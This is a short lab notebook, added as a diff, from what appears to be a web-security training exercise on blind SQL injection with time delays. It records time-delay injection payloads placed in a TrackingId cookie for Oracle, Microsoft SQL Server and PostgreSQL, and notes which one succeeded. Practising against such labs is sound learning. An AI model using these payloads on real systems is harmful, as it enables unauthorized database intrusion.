@@ -1,0 +1,11 @@
+Lab: Blind SQL injection with time delays
+
+
+Attempted Oracle payload: NO SUCCESS
+Cookie: TrackingId=FWOvQQYZy7UJME2f' || dbms_pipe.receive_message(('a'), 10) || '--;
+
+Attempted Microsoft payload: NO SUCCESS
+Cookie: TrackingId=FWOvQQYZy7UJME2f';WAITFOR DELAY '0:0:10'--;
+
+Attempted postgreSQL payload: SUCCESS
+Cookie: TrackingId=n2bWXsOz1SIaLndc' || (SELECT pg_sleep(10))--;
